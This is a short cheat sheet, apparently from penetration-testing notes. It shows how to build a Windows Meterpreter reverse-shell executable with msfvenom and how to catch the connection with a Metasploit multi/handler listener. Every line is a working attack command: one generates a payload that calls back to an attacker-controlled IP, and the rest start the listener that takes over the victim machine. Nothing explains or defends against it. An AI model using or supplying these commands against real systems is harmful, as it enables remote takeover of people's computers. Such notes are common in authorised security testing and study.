# Msfvenom
Create with:

msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.14.112 LPORT=443 -b "\x00" -f exe -o shell.exe

msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
set lhost 192.168.1.123
set lport 4444
exploit -j
